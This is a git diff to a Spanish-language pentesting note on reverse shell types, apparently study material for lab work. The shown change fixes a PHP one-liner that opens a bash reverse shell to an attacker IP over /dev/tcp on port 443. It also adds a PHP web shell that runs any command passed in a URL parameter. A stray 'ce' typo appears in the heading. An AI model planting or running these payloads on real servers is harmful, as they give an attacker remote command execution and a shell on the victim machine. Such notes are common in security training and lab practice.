@@ -1,4 +1,4 @@
-# Tipos de ReverShell
+ce# Tipos de ReverShell
 
 Tags: #ReverShell #Netcat #BindShell #Powershell #AMSI
 
@@ -309,8 +309,12 @@ https://github.com/t3l3machus/hoaxshell     # Descargar la herramienta
 
 ```php
 <?php
-   system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'")
+   system("bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'");
 ?>
+
+<?php
+   system($_GET["cmd"]);
+
 
 	# IP = IP de atacante
 	# 443 = Puerto a usar
